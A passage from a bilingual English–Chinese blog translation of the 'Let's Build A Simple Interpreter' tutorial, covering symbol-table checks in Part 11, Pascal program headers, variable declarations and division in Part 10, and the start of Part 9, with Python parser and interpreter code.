...”和“ Lookup: ...”消息的顺序，它们指示在符号表中定义和查找符号的顺序。会话中的最后一个命令输出 symbol 表的内容，您可以看到它与我们之前手动构建的 symbol 表的内容完全相同。AST 节点visitor 的神奇之处在于，他们几乎为您完成了所有的工作。😃 We can already put our symbol table and symbol table builder to good use: we can use them to verify that variables are declared before they are used in assignments and expressions. All we need to do is just extend the visitor with two more methods: visit_Assign and visit_Var: 我们已经可以很好地使用我们的符号表和符号表构建器: 我们可以使用它们来验证变量在用于赋值和表达式之前是否已经声明了。我们需要做的只是用两个方法扩展visitor: visit_Assign 和visit_Var: def visit_Assign(self, node): var_name = node.left.value # 获取node的左子节点的变量名，即赋值表达式左边的变量的name var_symbol = self.symtab.lookup(var_name) # 在符号表搜索符号 if var_symbol is None: raise NameError(repr(var_name)) self.visit(node.right) def visit_Var(self, node): var_name = node.value var_symbol = self.symtab.lookup(var_name) if var_symbol is None: raise NameError(repr(var_name)) These methods will raise a NameError exception if they cannot find the symbol in the symbol table. 如果这些方法无法在符号表中找到符号，则会引发 NameError 异常。 Take a look at the following program, where we reference the variable “b” that hasn’t been declared yet: 看看下面的程序，我们引用了一个尚未声明的变量“ b”: PROGRAM NameError1; VAR a : INTEGER; BEGIN a := 2 + b; END. Let’s see what happens if we construct an AST for the program and pass it to our symbol table builder to visit: 让我们看看如果我们为程序构造一个 AST 并将其传递给我们的符号表构建器以访问它会发生什么: $ python &gt;&gt;&gt; from spi import Lexer, Parser, SymbolTableBuilder &gt;&gt;&gt; text = &quot;&quot;&quot; ... PROGRAM NameError1; ... VAR ... a : INTEGER; ... ... BEGIN ... a := 2 + b; ... END. ... &quot;&quot;&quot; &gt;&gt;&gt; lexer = Lexer(text) &gt;&gt;&gt; parser = Parser(lexer) &gt;&gt;&gt; tree = parser.parse() &gt;&gt;&gt; symtab_builder = SymbolTableBuilder() Define: INTEGER Define: REAL &gt;&gt;&gt; symtab_builder.visit(tree) Lookup: INTEGER Define: &lt;a:INTEGER&gt; Lookup: a Lookup: b Traceback (most recent call last): ... File &quot;spi.py&quot;, line 674, in visit_Var raise NameError(repr(var_name)) NameError: 'b' Exactly what we were expecting! 这正是我们所期待的！ Here is another error case where we try to assign a value to a variable that hasn’t been defined yet, in this case the variable ‘a’: 下面是另一个错误的例子，我们试图给一个尚未定义的变量赋值，在这个例子中，变量 a: PROGRAM NameError2; VAR b : INTEGER; BEGIN b := 1; a := b + 2; END. Meanwhile, in the Python shell: 同时，在 Python shell 中: &gt;&gt;&gt; from spi import Lexer, Parser, SymbolTableBuilder &gt;&gt;&gt; text = &quot;&quot;&quot; ... PROGRAM NameError2; ... VAR ... b : INTEGER; ... ... BEGIN ... b := 1; ... a := b + 2; ... END. ... &quot;&quot;&quot; &gt;&gt;&gt; lexer = Lexer(text) &gt;&gt;&gt; parser = Parser(lexer) &gt;&gt;&gt; tree = parser.parse() &gt;&gt;&gt; symtab_builder = SymbolTableBuilder() Define: INTEGER Define: REAL &gt;&gt;&gt; symtab_builder.visit(tree) Lookup: INTEGER Define: &lt;b:INTEGER&gt; Lookup: b Lookup: a Traceback (most recent call last): ... File &quot;spi.py&quot;, line 665, in visit_Assign raise NameError(repr(var_name)) NameError: 'a' Great, our new visitor caught this problem too! 太好了，我们的新visitor也检测到了这个问题！ I would like to emphasize the point that all those checks that our SymbolTableBuilder AST visitor makes are made before the run-time, so before our interpreter actually evaluates the source program. To drive the point home if we were to interpret the following program: 我想强调的一点是，我们的 SymbolTableBuilder AST visitor 所做的所有检查都是在运行时之前进行的，因此是在我们的解释器实际评估源程序之前。如果我们要解释下面的程序，就要把这一点说清楚: PROGRAM Part11; VAR x : INTEGER; BEGIN x := 2; END. The contents of the symbol table and the run-time GLOBAL_MEMORY right before the program exited would look something like this: 在程序退出之前，符号表和运行时 GLOBAL_MEMORY 的内容如下: Do you see the difference? Can you see that the symbol table doesn’t hold the value 2 for variable “x”? That’s solely the interpreter’s job now. 你看出区别了吗？你能看到符号表中不包含变量“ x”的值2吗？这现在完全是翻译的工作了。 Remember the picture from Part 9 where the Symbol Table was used as global memory? 还记得第9部分中的图片吗，其中使用符号表作为全局内存？ No more! We effectively got rid of the hack where symbol table did double duty as global memory. 我们有效地解决了符号表作为全局内存的双重作用的hack问题。 Let’s put it all together and test our new interpreter with the following program: 让我们把它们放在一起，用下面的程序测试我们的新解释器: PROGRAM Part11; VAR number : INTEGER; a, b : INTEGER; y : REAL; BEGIN {Part11} number := 2; a := number ; b := 10 * a + 10 * number DIV 4; y := 20 / 7 + 3.14 END. {Part11} Save the program as part11.pas and fire up the interpreter: 将程序保存为 part11.pas 并启动解释器: $ python spi.py part11.pas Define: INTEGER Define: REAL Lookup: INTEGER Define: &lt;number:INTEGER&gt; Lookup: INTEGER Define: &lt;a:INTEGER&gt; Lookup: INTEGER Define: &lt;b:INTEGER&gt; Lookup: REAL Define: &lt;y:REAL&gt; Lookup: number Lookup: a Lookup: number Lookup: b Lookup: a Lookup: number Lookup: y Symbol Table contents: Symbols: [INTEGER, REAL, &lt;number:INTEGER&gt;, &lt;a:INTEGER&gt;, &lt;b:INTEGER&gt;, &lt;y:REAL&gt;] Run-time GLOBAL_MEMORY contents: a = 2 b = 25 number = 2 y = 5.99714285714 I’d like to draw your attention again to the fact that the Interpreter class has nothing to do with building the symbol table and it relies on the SymbolTableBuilder to make sure that the variables in the source code are properly declared before they are used by the Interpreter. 我想再次提醒大家注意这样一个事实，即 Interpreter 类与构建符号表无关，它依赖于 SymbolTableBuilder 来确保源代码中的变量在被 Interpreter 使用之前被正确声明。 Check your understanding 检查你的理解 What is a symbol? 什么是符号？ 某些程序实体(如变量、子例程或内置类型)的标识符 Why do we need to track symbols? 为什么我们需要追踪符号？ 为了确保在给变量赋值时，type是正确的（type检查） 确保在使用变量之前声明该变量。 What is a symbol table? 什么是符号表？ 符号表是一个用于追踪程序源代码中各种符号的抽象数据类型(ADT) What is the difference between defining a symbol and resolving/looking up the symbol? 定义一个符号和解析/查找这个符号有什么区别？ 定义一个符号就是把该符号插入到符号表中，符号名作为键，符号实例作为值（值不再是Part9里的符号值了）。 解析/查找一个符号就是在符号表中通过符号名搜索这个符号，找到就返回符号实例，否则返回None。 方法 define 将符号作为参数，并将其存储在符号名作为键和符号实例作为值的 _symbols 有序字典中。方法 lookup 接受一个符号名作为参数，如果找到它就返回一个符号，如果找不到就返回“ None”。 Given the following small Pascal program, what would be the contents of the symbol table, the global memory (the GLOBAL_MEMORY dictionary that is part of the _Interpreter _) ？ 给定下面的小 Pascal 程序，符号表和全局内存的内容是什么？（GLOBAL_MEMORY字典是解释器的一部分）？ PROGRAM Part11; VAR x, y : INTEGER; BEGIN x := 2; y := 3 + x; END. 符号表 INTEGER BuiltinTypeSymbol instance REAL BuiltinTypeSymbol instance x VarSymbol instance y VarSymbol instance 全局内存 x 2 y 5 GLOBAL_MEMORY字典是解释器的一部分。 That’s all for today. In the next article, I’ll talk about scopes and we’ll get our hands dirty with parsing nested procedures. Stay tuned and see you soon! And remember that no matter what, “Keep going!” 今天就到这里吧。在下一篇文章中，我将讨论 域，并且我们将亲自操作解析嵌套过程。请继续关注，我们很快就会再见！记住，无论发生什么，“继续前进!” get our hands dirty ：弄脏手，所以真实意思就是：亲自动手操作。 P.S. My explanation of the topic of symbols and symbol table management is heavily influenced by the book Language Implementation Patterns by Terence Parr. It’s a terrific book. I think it has the clearest explanation of the topic I’ve ever seen and it also covers class scopes, a subject that I’m not going to cover in the series because we will not be discussing object-oriented Pascal. 附: 我对符号和符号表管理主题的解释深受 Terence Parr 的《语言实现模式》一书的影响。这是一本很棒的书。我认为它对我所见过的主题有最清晰的解释，它还涵盖了class的范围，这个主题我不打算在本系列中讨论，因为我们不会讨论面向对象的 Pascal。 P.P.S.: If you can’t wait and want to start digging into compilers, I highly recommend the freely available classic by Jack Crenshaw “Let’s Build a Compiler.” 附言: 如果你迫不及待想开始挖掘编译器，我强烈推荐 Jack Crenshaw 的免费经典作品“ Let’s Build a Compiler” All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part-11/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part 10.","content":"Today we will continue closing the gap between where we are right now and where we want to be: a fully functional interpreter for a subset of Pascal programming language. 今天，我们将继续缩小我们现在所处的位置和我们想要达到的位置之间的差距: 一个用于 Pascal 编程语言子集的全功能解释器。 In this article we will update our interpreter to parse and interpret our very first complete Pascal program. The program can also be compiled by the Free Pascal compiler, fpc. 在本文中，我们将更新我们的解释器来解析和解释我们的第一个完整的 Pascal 程序。该程序也可以通过Free Pascal compiler, fpc 编译。 Here is the program itself: 下面是程序: PROGRAM Part10; VAR number : INTEGER; a, b, c, x : INTEGER; y : REAL; BEGIN {Part10} BEGIN number := 2; a := number; b := 10 * a + 10 * number DIV 4; c := a - - b END; x := 11; y := 20 / 7 + 3.14; { writeln('a = ', a); } { writeln('b = ', b); } { writeln('c = ', c); } { writeln('number = ', number); } { writeln('x = ', x); } { writeln('y = ', y); } END. {Part10} Before we start digging into the details, download the source code of the interpreter from GitHub and the Pascal source code above, and try it on the command line: 在我们开始深入研究细节之前，先从 GitHub 下载解释器的源代码和上面的 Pascal 源代码，然后在命令行上试一试: $ python spi.py part10.pas a = 2 b = 25 c = 27 number = 2 x = 11 y = 5.99714285714 If I remove the comments around the writeln statements in the part10.pas file, compile the source code with fpc and then run the produced executable, this is what I get on my laptop: 如果我删除 part10.pas 文件中 writeln 语句周围的注释，用 fpc 编译源代码，然后运行生成的可执行文件，这就是我在笔记本电脑上得到的结果: $ fpc part10.pas $ ./part10 a = 2 b = 25 c = 27 number = 2 x = 11 y = 5.99714285714286E+000 Okay, let’s see what we’re going cover today: 好的，让我们看看今天我们要学习什么: We will learn how to parse and interpret the Pascal _PROGRAM _ header 我们将学习如何解析和解释 Pascal PROGRAM header We will learn how to parse Pascal variable declarations 我们将学习如何解析 Pascal 变量声明 We will update our interpreter to use the DIV keyword for integer division and a forward slash / for float division 我们将更新我们的解释器以使用DIV关键字表示整数除法，斜杠/表示浮点除法 We will add support for Pascal comments 我们将增加对 Pascal 注释的支持 Let’s dive in and look at the grammar changes first. Today we will add some new rules and update some of the existing rules. 让我们先深入研究一下语法的变化。今天我们将添加一些新的规则并更新一些现有的规则。 The program definition grammar rule is updated to include the PROGRAM reserved keyword, the program name, and a block that ends with a dot. Here is an example of a complete Pascal program: _**program **_定义grammar规则被更新为包含 PROGRAM 保留关键字、程序名称和以点结尾的块。下面是一个完整的 Pascal 程序的例子: PROGRAM Part10; BEGIN END. The block rule combines a declarations rule and a compound_statement rule. We’ll also use the rule later in the series when we add procedure declarations. Here is an example of a block: block 规则结合了一个 _declarations _规则和一个 _compound_statement _规则。在本系列后面添加 procedure declarations 时，我们还将使用该规则。下面是一个 block 的例子: VAR number : INTEGER; BEGIN END Here is another example: 下面是另一个例子: BEGIN END Pascal declarations have several parts and each part is optional. In this article, we’ll cover the variable declaration part only. The declarations rule has either a variable declaration sub-rule or it’s empty. Pascal declarations 有几个部分，每个部分都是可选的。在本文中，我们将只讨论变量声明部分。声明规则要么有一个变量声明子规则，要么为空。 Pascal is a statically typed language, which means that every variable needs a variable declaration that explicitly specifies its type. In Pascal, variables must be declared before they are used. This is achieved by declaring variables in the program variable declaration section using the VAR reserved keyword. You can define variables like this: Pascal 是一种静态类型语言，这意味着每个变量都需要一个变量声明来明确指定它的类型。在 Pascal 语言中，变量在使用之前必须被声明。这是通过使用 VAR 保留关键字在程序变量声明部分中声明变量来实现的。你可以这样定义变量: VAR number : INTEGER; a, b, c, x : INTEGER; y : REAL; The type_spec rule is for handling INTEGER and REAL types and is used in variable declarations. In the example below type_spec 规则用于处理 INTEGER 和 REAL 类型，并用于变量声明 VAR a : INTEGER; b : REAL; the variable “a” is declared with the type INTEGER and the variable “b” is declared with the type REAL (float). In this article we won’t enforce type checking, but we will add type checking later in the series. 变量“ a”声明为 INTEGER 类型，变量“ b”声明为 REAL (float)类型。在本文中，我们不会强制执行类型检查，但是我们将在本系列的后面部分中添加类型检查。 The term rule is updated to use the DIV keyword for integer division and a forward slash / for float division. _**term **_规则更新为使用 DIV 关键字进行整数除法，使用正斜杠 / 进行浮点除法。 Before, dividing 20 by 7 using a forward slash would produce an INTEGER 2: 在此之前，20用正斜杠除以7会得到一个 INTEGER 2: Now, dividing 20 by 7 using a forward slash will produce a REAL (floating point number) 2.85714285714 : 现在，用正斜杠除以20得到一个 REAL (浮点数)2.85714285714: From now on, to get an INTEGER instead of a REAL, you need to use the DIV keyword: 从现在开始，为了得到一个 INTEGER 而不是 REAL，你需要使用 DIV 关键字: The factor rule is updated to handle both integer and real (float) constants. I also removed the INTEGER sub-rule because the constants will be represented by INTEGER_CONST and REAL_CONST tokens and the INTEGER token will be used to represent the integer type. In the example below the lexer will generate an INTEGER_CONST token for 20 and 7 and a REAL_CONST token for 3.14 : _**factor **_规则被更新以处理整数和实数(浮点数)常量。我还删除了 INTEGER 子规则，因为常量将由 INTEGER_CONST 和 REAL_CONST token表示，而 INTEGER token将用于表示整数类型。在下面的例子中，lexer 将为20和7生成一个 INTEGER_CONST token，为3.14生成一个 REAL_CONST token： Here is our complete grammar for today: 以下是我们今天的完整语法: program : PROGRAM variable SEMI block DOT block : declarations compound_statement declarations : VAR (variable_declaration SEMI)+ | empty variable_declaration : ID (COMMA ID)* COLON type_spec type_spec : INTEGER | REAL compound_statement : BEGIN statement_list END statement_list : statement | statement SEMI statement_list statement : compound_statement | assignment_statement | empty assignment_statement : variable ASSIGN expr empty : expr : term ((PLUS | MINUS) term)* term : factor ((MUL | INTEGER_DIV | FLOAT_DIV) factor)* factor : PLUS factor | MINUS factor | INTEGER_CONST | REAL_CONST | LPAREN expr RPAREN | variable variable: ID In the rest of the article we’ll go through the same drill we went through last time: 在本文的其余部分，我们将重复上次的操作: Update the lexer 更新 lexer Update the parser 更新解析器 Update the interpreter 更新解释器 Updating the Lexer Here is a summary of the lexer changes: 下面是 lexer 更改的摘要: New tokens 新的tokens New and updated reserved keywords 新的和更新的保留关键字 New _skip_comment _ method to handle Pascal comments 新的_skip_comment_方法来处理 Pascal 注释 Rename the _integer _method and make some changes to the method itself 重命名 _integer _方法，并对方法本身进行一些更改 Update the _get_next_token _ method to return new tokens 更新_get_next_token_方法以返回新的token Let’s dig into the changes mentioned above: 让我们深入研究一下上面提到的变化: To handle a program header, variable declarations, integer and float constants as well as integer and float division, we need to add some new tokens - some of which are reserved keywords - and we also need to update the meaning of the INTEGER token to represent the integer type and not an integer constant. Here is a complete list of new and updated tokens: 为了处理程序头、变量声明、整数和浮点数常量以及整数和浮点数除法，我们需要添加一些新的token(其中一些是保留关键字) ，我们还需要更新 INTEGER token的含义，以表示整数类型，而不是整数常量。下面是新的和更新的token的完整列表: PROGRAM (reserved keyword) VAR (reserved keyword) COLON (😃 COMMA (,) INTEGER (we change it to mean integer type and not integer constant like 3 or 5) REAL (for Pascal REAL type) INTEGER_CONST (for example, 3 or 5) REAL_CONST (for example, 3.14 and so on) INTEGER_DIV for integer division (the DIV reserved keyword) FLOAT_DIV for float division ( forward slash / ) Here is the complete mapping of reserved keywords to tokens: 下面是保留关键字到token的完整映射: RESERVED_KEYWORDS = { 'PROGRAM': Token('PROGRAM', 'PROGRAM'), 'VAR': Token('VAR', 'VAR'), 'DIV': Token('INTEGER_DIV', 'DIV'), 'INTEGER': Token('INTEGER', 'INTEGER'), 'REAL': Token('REAL', 'REAL'), 'BEGIN': Token('BEGIN', 'BEGIN'), 'END': Token('END', 'END'), } We’re adding the skip_comment method to handle Pascal comments. The method is pretty basic and all it does is discard all the characters until the closing curly brace is found: 我们添加了 skip_comment 方法来处理 Pascal 注释。这个方法非常简单，它所做的就是丢弃所有的字符，直到找到结束花括号: def skip_comment(self): while self.current_char != '}': self.advance() self.advance() # the closing curly brace We are renaming the integer method the number method. It can handle both integer constants and float constants like 3 and 3.14: 我们将 _integer _方法重命名为 number 方法。它可以处理整型常量和浮点型常量，比如3和3.14: def number(self): &quot;&quot;&quot;Return a (multidigit) integer or float consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() if self.current_char == '.': result += self.current_char self.advance() while ( self.current_char is not None and self.current_char.isdigit() ): result += self.current_char self.advance() token = Token('REAL_CONST', float(result)) else: token = Token('INTEGER_CONST', int(result)) return token We’re also updating the get_next_token method to return new tokens: 我们还更新了 get_next_token 方法来返回新的令牌: def get_next_token(self): while self.current_char is not None: ... if self.current_char == '{': self.advance() self.skip_comment() continue ... if self.current_char.isdigit(): return self.number() if self.current_char == ':': self.advance() return Token(COLON, ':') if self.current_char == ',': self.advance() return Token(COMMA, ',') ... if self.current_char == '/': self.advance() return Token(FLOAT_DIV, '/') ... Updating the Parser 更新解析器 Now onto the parser changes. 现在转到解析器更改上。 Here is a summary of the changes: 以下是这些变化的摘要: ​ New AST nodes: Program, Block, VarDecl, Type 新的AST节点：Program, Block, VarDecl, Type New methods corresponding to new grammar rules: block, declarations, variable_declaration, and type_spec. 对应新规则的新方法：block, declarations, variable_declaration, and _type_spec_​ Updates to the existing parser methods: program, term, and factor 更新现有的方法：program, term, and factor Let’s go over the changes one by one: 让我们一个一个来看一下这些变化: We’ll start with new AST nodes first. There are four new nodes: 我们首先从新的 AST 节点开始，有四个新节点: The Program AST node represents a program and will be our root node Program AST 节点表示一个程序，将是我们的根节点 class Program(AST): def __init__(self, name, block): self.name = name self.block = block The Block AST node holds declarations and a compound statement: Block AST 节点包含声明和一个复合语句: class Block(AST): def __init__(self, declarations, compound_statement): self.declarations = declarations self.compound_statement = compound_statement The VarDecl AST node represents a variable declaration. It holds a variable node and a type node: _VarDecl _AST 节点表示一个变量声明，它包含一个变量节点和一个类型节点: class VarDecl(AST): def __init__(self, var_node, type_node): self.var_node = var_node self.type_node = type_node The Type AST node represents a variable type (INTEGER or REAL): Type AST 节点表示一个变量类型(INTEGER 或 REAL) : class Type(AST): def __init__(self, token): self.token = token self.value = token.value As you probably remember, each rule from the grammar has a corresponding method in our recursive-descent parser. Today we’re adding four new methods: block, declarations, variable_declaration, and type_spec. These methods are responsible for parsing new language constructs and constructing new AST nodes: 您可能还记得，在我们的递归下降分析器中，文法中的每个规则都有一个对应的方法。今天我们添加了四个新方法: block、 declaration、 variable_declaration 和 type_spec。这些方法负责解析新的语言结构并构造新的 AST 节点: def block(self): &quot;&quot;&quot;block : declarations compound_statement&quot;&quot;&quot; declaration_nodes = self.declarations() compound_statement_node = self.compound_statement() node = Block(declaration_nodes, compound_statement_node) return node def declarations(self): &quot;&quot;&quot;declarations : VAR (variable_declaration SEMI)+ | empty &quot;&quot;&quot; declarations = [] if self.current_token.type == VAR: self.eat(VAR) while self.current_token.type == ID: var_decl = self.variable_declaration() declarations.extend(var_decl) self.eat(SEMI) return declarations def variable_declaration(self): &quot;&quot;&quot;variable_declaration : ID (COMMA ID)* COLON type_spec&quot;&quot;&quot; var_nodes = [Var(self.current_token)] # first ID self.eat(ID) while self.current_token.type == COMMA: self.eat(COMMA) var_nodes.append(Var(self.current_token)) self.eat(ID) self.eat(COLON) type_node = self.type_spec() var_declarations = [ VarDecl(var_node, type_node) for var_node in var_nodes ] return var_declarations def type_spec(self): &quot;&quot;&quot;type_spec : INTEGER | REAL &quot;&quot;&quot; token = self.current_token if self.current_token.type == INTEGER: self.eat(INTEGER) else: self.eat(REAL) node = Type(token) return node We also need to update the program, term, and, factor methods to accommodate our grammar changes: 我们还需要更新_program_、_term _和 factor 方法，以适应我们的语法变化: def program(self): &quot;&quot;&quot;program : PROGRAM variable SEMI block DOT&quot;&quot;&quot; self.eat(PROGRAM) var_node = self.variable() prog_name = var_node.value self.eat(SEMI) block_node = self.block() program_node = Program(prog_name, block_node) self.eat(DOT) return program_node def term(self): &quot;&quot;&quot;term : factor ((MUL | INTEGER_DIV | FLOAT_DIV) factor)*&quot;&quot;&quot; node = self.factor() while self.current_token.type in (MUL, INTEGER_DIV, FLOAT_DIV): token = self.current_token if token.type == MUL: self.eat(MUL) elif token.type == INTEGER_DIV: self.eat(INTEGER_DIV) elif token.type == FLOAT_DIV: self.eat(FLOAT_DIV) node = BinOp(left=node, op=token, right=self.factor()) return node def factor(self): &quot;&quot;&quot;factor : PLUS factor | MINUS factor | INTEGER_CONST | REAL_CONST | LPAREN expr RPAREN | variable &quot;&quot;&quot; token = self.current_token if token.type == PLUS: self.eat(PLUS) node = UnaryOp(token, self.factor()) return node elif token.type == MINUS: self.eat(MINUS) node = UnaryOp(token, self.factor()) return node elif token.type == INTEGER_CONST: self.eat(INTEGER_CONST) return Num(token) elif token.type == REAL_CONST: self.eat(REAL_CONST) return Num(token) elif token.type == LPAREN: self.eat(LPAREN) node = self.expr() self.eat(RPAREN) return node else: node = self.variable() return node Now, let’s see what the Abstract Syntax Tree looks like with the new nodes. Here is a small working Pascal program: 现在，让我们来看看使用这些新节点后的抽象语法树是什么样子的。下面是一个小型的 Pascal 程序: PROGRAM Part10AST; VAR a, b : INTEGER; y : REAL; BEGIN {Part10AST} a := 2; b := 10 * a + 10 * a DIV 4; y := 20 / 7 + 3.14; END. {Part10AST} Let’s generate an AST and visualize it with the genastdot.py: 让我们生成一个 AST，并用 genastdot.py 将其可视化: $ python genastdot.py part10ast.pas &gt; ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot In the picture you can see the new nodes that we have added. 在图中可以看到我们添加的新节点。 Updating the Interpreter 更新解释器 We’re done with the lexer and parser changes. What’s left is to add new visitor methods to our Interpreter class. There will be four new methods to visit our new nodes: 我们已经完成了 lexer 和解析器的更改。剩下的工作是向我们的 Interpreter 类添加新的 visitor 方法。将有四种新方法访问我们的新节点: visit_Program visit_Block visit_VarDecl visit_Type They are pretty straightforward. You can also see that the Interpreter does nothing with VarDecl and Type nodes: 你也可以看到 Interpreter 对 VarDecl 和 Type 节点什么也不做: def visit_Program(self, node): self.visit(node.block) def visit_Block(self, node): for declaration in node.declarations: self.visit(declaration) self.visit(node.compound_statement) def visit_VarDecl(self, node): # Do nothing pass def visit_Type(self, node): # Do nothing pass We also need to update the visit_BinOp method to properly interpret integer and float divisions: 我们还需要更新 visit_BinOp 方法来正确解释整数和浮点数部分: def visit_BinOp(self, node): if node.op.type == PLUS: return self.visit(node.left) + self.visit(node.right) elif node.op.type == MINUS: return self.visit(node.left) - self.visit(node.right) elif node.op.type == MUL: return self.visit(node.left) * self.visit(node.right) elif node.op.type == INTEGER_DIV: return self.visit(node.left) // self.visit(node.right) elif node.op.type == FLOAT_DIV: return float(self.visit(node.left)) / float(self.visit(node.right)) Let’s sum up what we had to do to extend the Pascal interpreter in this article: 让我们总结一下我们在本文中为扩展 Pascal 解释器所做的工作: Add new rules to the grammar and update some existing rules 向语法中添加新规则并更新一些现有规则 Add new tokens and supporting methods to the lexer, update and modify some existing methods 向 lexer 添加新的token和支持方法，更新和修改一些现有的方法 Add new AST nodes to the parser for new language constructs 添加新的AST节点到解析器以解析新语言结构 Add new methods corresponding to the new grammar rules to our recursive-descent parser and update some existing methods 在我们的递归下降分析器中添加与新文法规则相对应的新方法，并更新一些现有的方法 Add new visitor methods to the interpreter and update one existing visitor method 向解释器添加新的visitor方法并更新一个现有的visitor方法 As a result of our changes we also got rid of some of the hacks I introduced in Part 9, namely: 作为修改的结果，我们还删除了我在第9部分介绍的一些hacks，即: Our interpreter can now handle the **PROGRAM ** header 解释器现在可以处理_**PROGRAM **_ header Variables can now be declared using the VAR keyword 变量现在可以使用VAR关键字声明了 The DIV keyword is used for integer division and a forward slash / is used for float division DIV 关键字用于整数除法，正斜杠/用于浮点除法 If you haven’t done so yet, then, as an exercise, re-implement the interpreter in this article without looking at the source code and use part10.pas as your test input file. 如果您还没有这样做，那么，作为练习，在本文中重新实现解释器，不要查看源代码，并使用 part10.pas 作为您的测试输入文件。 That’s all for today. In the next article, I’ll talk in greater detail about symbol table management. Stay tuned and see you soon! 今天就到这里吧。在下一篇文章中，我将更详细地讨论符号表管理。请继续关注，我们很快就会再见！ All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part-10/"},{"title":"[翻译与学习] Let's Build A Simple Interpreter. Part 9","content":"I remember when I was in university (a long time ago) and learning systems programming, I believed that the only “real” languages were Assembly and C. And Pascal was - how to put it nicely - a very high-level language used by application developers who didn’t want to know what was going on under the hood. 我记得当我在大学学习系统编程的时候(很久以前) ，我相信唯一“真正”的语言是汇编语言和 c 语言，而 Pascal 语言——怎么说好听点——是一种非常高级的语言，被那些不想知道背后发生了什么的应用程序开发人员所使用。 Little did I know back then that I would be writing almost everything in Python (and love every bit of it) to pay my bills and that I would also be writing an interpreter and compiler for Pascal for the reasons I stated in the very first article of the series. 当时我并不知道，为了支付账单(???)，我几乎要用 Python 写所有的东西(并且喜欢它的每一点) ，而且我还要为 Pascal 编写一个解释器和编译器，原因我在本系列的第一篇文章中就提到过。 These days, I consider myself a programming languages enthusiast, and I’m fascinated by all languages and their unique features. Having said that, I have to note that I enjoy using certain languages way more than others. I am biased and I’ll be the first one to admit that. 😃 这些天，我认为自己是一个编程语言爱好者，我着迷于所有的语言和它们的独特功能。话虽如此，我必须指出，我比其他人更喜欢使用某些语言。我是有偏见的，我将是第一个承认这一点的人。😃 This is me before: 这是我以前的样子: And now: 现在: Okay, let’s get down to business. Here is what you’re going to learn today: 好了，让我们言归正传。以下是你今天要学习的内容: How to parse and interpret a Pascal program definition. 如何解析和解释 Pascal 程序定义 How to parse and interpret compound statements. 如何解析和解释复合语句 How to parse and interpret assignment statements, including variables. 如何解析和解释赋值语句，包括变量 A bit about symbol tables and how to store and lookup variables. 关于符号表以及如何存储和查找变量 I’ll use the following sample Pascal-like program to introduce new concepts: 我将使用下面这个类似 pascal 的程序来介绍一些新的概念: BEGIN BEGIN number := 2; a := number; b := 10 * a + 10 * number / 4; c := a - - b END; x := 11; END. You could say that that’s quite a jump from the command line interpreter you wrote so far by following the previous articles in the series, but it’s a jump that I hope will bring excitement. It’s not “just” a calculator anymore, we’re getting serious here, Pascal serious. 😃 